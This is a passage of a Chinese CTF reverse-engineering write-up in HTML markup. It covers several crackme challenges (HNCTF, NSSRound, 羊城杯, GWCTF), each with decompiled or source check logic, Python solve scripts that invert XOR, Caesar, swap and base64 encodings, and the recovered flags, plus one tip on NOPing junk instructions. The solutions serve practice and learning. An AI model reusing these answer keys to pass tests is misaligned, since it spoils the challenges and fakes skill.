number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    start<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    end<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span>    path<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 清空路径列表</span>    find_path<span class="token punctuation">(</span>maze<span class="token punctuation">,</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span>    see_path<span class="token punctuation">(</span>maze<span class="token punctuation">,</span>path<span class="token punctuation">)</span> <span class="token comment">#wwdddwwwaaawwwwwwwwwddddssssdddssdsssssssdddwwwwddsssd</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hnctf-2022-week1你知道什么是py嘛"><a class="markdownIt-Anchor" href="#hnctf-2022-week1你知道什么是py嘛"></a> [HNCTF 2022 Week1]你知道什么是Py嘛？</h2><h3 id="题目描述-24"><a class="markdownIt-Anchor" href="#题目描述-24"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"please input your flag:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>arr<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">]</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">35</span>  <span class="token keyword">or</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'N'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!=</span>arr<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error!"</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"right!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-23"><a class="markdownIt-Anchor" href="#exp-23"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">arr<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'N'</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag_list<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>flag_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#NSSCTF&#123;Pyth0n_1s_th3_best_l@nguage&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="nssround3-teamjump_by_jump_revenge"><a class="markdownIt-Anchor" href="#nssround3-teamjump_by_jump_revenge"></a> [NSSRound#3 Team]jump_by_jump_revenge</h2><h3 id="题目描述-25"><a class="markdownIt-Anchor" href="#题目描述-25"></a> 题目描述</h3><p>翻一翻，有个地方爆红了，是花指令。<br /><img src="https://www.nssctf.cn/files/2024/1/27/8f826b271b.jpg" alt="NSSIMAGE" / loading="lazy"><br />选中红的这里，按’U’，用16进制显示，把&quot;0E90&quot;NOP掉。<br /><img src="https://www.nssctf.cn/files/2024/1/27/85fc4c0950.jpg" alt="NSSIMAGE" / loading="lazy"><br />重新对main函数反编译，F5可以查看到正常的伪代码。<br /><img src="https://www.nssctf.cn/files/2024/1/27/c0c448e80b.jpg" alt="NSSIMAGE" / loading="lazy"></p><h3 id="exp-24"><a class="markdownIt-Anchor" href="#exp-24"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">''''''</span><span class="token triple-quoted-string string">''''''</span><span class="token triple-quoted-string string">'''''这是正向流程for i in range(28):    k=(i*i+123)%21    a[i]=(a[i]+a[k]) % 0x60 + 0x20'''</span><span class="token triple-quoted-string string">''''''</span><span class="token triple-quoted-string string">''''''</span><span class="token string">''</span>a<span class="token operator">=</span><span class="token string">"~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*"</span>a<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    k<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">21</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        x<span class="token operator">=</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">+</span>j<span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> x<span class="token operator">>=</span><span class="token number">33</span> <span class="token keyword">and</span> x<span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">:</span>            a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="羊城杯-2020easyre"><a class="markdownIt-Anchor" href="#羊城杯-2020easyre"></a> [羊城杯 2020]easyre</h2><h3 id="题目描述-26"><a class="markdownIt-Anchor" href="#题目描述-26"></a> 题目描述</h3><h4 id="第二重加密"><a class="markdownIt-Anchor" href="#第二重加密"></a> 第二重加密</h4><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">__int64 __fastcall encode_two(const char *a1, int a2, char *a3, int *a4)&#123;  char *Source; &#x2F;&#x2F; [rsp+40h] [rbp+10h]  char *v6; &#x2F;&#x2F; [rsp+50h] [rbp+20h]  Source &#x3D; (char *)a1;  v6 &#x3D; a3;  if ( !a1 || !a2 )    return 0xFFFFFFFFi64;  strncpy(a3, a1 + 26, 0xDui64);  strncpy(v6 + 13, Source, 0xDui64);  strncpy(v6 + 26, Source + 39, 0xDui64);  strncpy(v6 + 39, Source + 13, 0xDui64);  return 0i64;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>encode_two(&amp;v10, v4, &amp;v9, &amp;v12) == 0</p><p>根据前面的推断，第三个参数应该是加密后的密文，用一个Source指针指向原来的明文，然后进行strncpy操作</p><p>strncpy(a3, a1 + 26, 0xDui64);</p><p>strncpy(v6 + 13, Source, 0xDui64);</p><p>strncpy(v6 + 26, Source + 39, 0xDui64);</p><p>strncpy(v6 + 39, Source + 13, 0xDui64);</p><p>就是一个简单的替换加密</p><h4 id="第三重加密"><a class="markdownIt-Anchor" href="#第三重加密"></a> 第三重加密</h4><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">__int64 __fastcall encode_three(const char *flag3, int lflag3, char *str1, int *a4)&#123;  char v5; &#x2F;&#x2F; [rsp+Fh] [rbp-11h]  int i; &#x2F;&#x2F; [rsp+14h] [rbp-Ch]  const char *strflag3index; &#x2F;&#x2F; [rsp+30h] [rbp+10h]  strflag3index &#x3D; flag3;  if ( !flag3 || !lflag3 )    return 0xFFFFFFFFi64;  for ( i &#x3D; 0; i &lt; lflag3; ++i )  &#123;    v5 &#x3D; *strflag3index;    if ( *strflag3index &lt;&#x3D; 64 || v5 &gt; 90 )    &#123;      if ( v5 &lt;&#x3D; &#39;&#96;&#39; || v5 &gt; &#39;z&#39; )      &#123;        if ( v5 &lt;&#x3D; &#39;&#x2F;&#39; || v5 &gt; &#39;9&#39; )          *str1 &#x3D; v5;        else          *str1 &#x3D; (v5 - &#39;0&#39; + 3) % 10 + &#39;0&#39;;      &#125;      else      &#123;        *str1 &#x3D; (v5 - &#39;a&#39; + 3) % 26 + &#39;a&#39;;      &#125;    &#125;    else    &#123;      *str1 &#x3D; (v5 - &#39;A&#39; + 3) % 26 + &#39;A&#39;;    &#125;    ++str1;    ++strflag3index;  &#125;  return 0i64;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这实际上是右移量为3的凯撒加密算法</p><h3 id="exp-25"><a class="markdownIt-Anchor" href="#exp-25"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''正向过程先base64加密再encode2位交换再encode3凯撒加密   '''</span><span class="token keyword">import</span> base64Str1<span class="token operator">=</span><span class="token string">"EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG"</span><span class="token keyword">def</span> <span class="token function">decrypt_caesar</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span>key<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#解谜函数</span>    text<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token keyword">and</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">:</span>            text <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">65</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">-</span> key<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token keyword">and</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">:</span>            text <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">-</span> key<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">48</span> <span class="token keyword">and</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">:</span>            text <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">-</span> key<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            text<span class="token operator">+=</span>i    <span class="token keyword">return</span> textflag3<span class="token operator">=</span>decrypt_caesar<span class="token punctuation">(</span>Str1<span class="token punctuation">)</span>flag2<span class="token operator">=</span>flag3<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span>flag3<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span>flag3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span>flag3<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">:</span><span class="token number">39</span><span class="token punctuation">]</span><span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag2<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>    flag2 <span class="token operator">+=</span> <span class="token string">"="</span>flag1<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag2<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span> <span class="token comment">#b'GWHT&#123;672cc4778a38e80cb362987341133ea2&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="gwctf-2019pyre"><a class="markdownIt-Anchor" href="#gwctf-2019pyre"></a> [GWCTF 2019]pyre</h2><h3 id="题目描述-27"><a class="markdownIt-Anchor" href="#题目描述-27"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span> <span class="token string">"Welcome to Re World!"</span><span class="token keyword">print</span> <span class="token string">"Your input1 is your flag~"</span>l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input1<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>input1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span> <span class="token operator">+</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span>    code <span class="token operator">+=</span> num<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> code<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span> codecode <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">"%1f"</span><span class="token punctuation">,</span>    <span class="token string">"%12"</span><span class="token punctuation">,</span>    <span class="token string">"%1d"</span><span class="token punctuation">,</span>    <span class="token string">"("</span><span class="token punctuation">,</span>    <span class="token string">"0"</span><span class="token punctuation">,</span>    <span class="token string">"4"</span><span class="token punctuation">,</span>    <span class="token string">"%01"</span><span class="token punctuation">,</span>    <span class="token string">"%06"</span><span class="token punctuation">,</span>    <span class="token string">"%14"</span><span class="token punctuation">,</span>    <span class="token string">"4"</span><span class="token punctuation">,</span>    <span class="token string">","</span><span class="token punctuation">,</span>    <span class="token string">"%1b"</span><span class="token punctuation">,</span>    <span class="token string">"U"</span><span class="token punctuation">,</span>    <span class="token string">"?"</span><span class="token punctuation">,</span>    <span class="token string">"o"</span><span class="token punctuation">,</span>    <span class="token string">"6"</span><span class="token punctuation">,</span>    <span class="token string">"*"</span><span class="token punctuation">,</span>    <span class="token string">":"</span><span class="token punctuation">,</span>    <span class="token string">"%01"</span><span class="token punctuation">,</span>    <span class="token string">"D"</span><span class="token punctuation">,</span>    <span class="token string">";"</span><span class="token punctuation">,</span>    <span class="token string">"%"</span><span class="token punctuation">,</span>    <span class="token string">"%13"</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-26"><a class="markdownIt-Anchor" href="#exp-26"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"\x1f"</span><span class="token punctuation">,</span><span class="token string">"\x12"</span><span class="token punctuation">,</span><span class="token string">"\x1d"</span><span class="token punctuation">,</span><span class="token string">"("</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">,</span><span class="token string">"\x01"</span><span class="token punctuation">,</span><span class="token string">"\x06"</span><span class="token punctuation">,</span><span class="token string">"\x14"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">,</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">"\x1b"</span><span class="token punctuation">,</span><span class="token string">"U"</span><span class="token punctuation">,</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">"o"</span><span class="token punctuation">,</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"\x01"</span><span class="token punctuation">,</span><span class="token string">"D"</span><span class="token punctuation">,</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"%"</span><span class="token punctuation">,</span><span class="token string">"\x13"</span><span class="token punctuation">,</span><span class="token punctuation">]</span>l<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>code<span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> code<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>code<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>j<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">128</span><span class="token operator">+</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">128</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token comment">#GWHT&#123;Just_Re_1s_Ha66y!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="广东省大学生攻防大赛-2022pyre"><a class="markdownIt-Anchor" href="#广东省大学生攻防大赛-2022pyre"></a> [广东省大学生攻防大赛 2022]pyre</h2><h3 id="题目描述-28"><a class="markdownIt-Anchor" href="#题目描述-28"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"plz input your flag:"</span><span class="token punctuation">)</span>    c <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token 